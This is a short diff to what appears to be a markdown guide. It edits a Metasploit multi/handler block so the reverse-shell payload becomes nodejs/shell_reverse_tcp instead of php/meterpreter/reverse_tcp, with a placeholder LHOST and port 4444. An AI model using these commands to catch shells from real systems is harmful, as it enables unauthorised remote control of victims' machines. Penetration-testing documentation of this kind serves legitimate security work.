@@ -470,7 +470,7 @@ node proxy.js
 
 ```bash
 use exploit/multi/handler
-set payload php/meterpreter/reverse_tcp
+set payload nodejs/shell_reverse_tcp
 set LHOST <IP>
 set LPORT 4444
 run
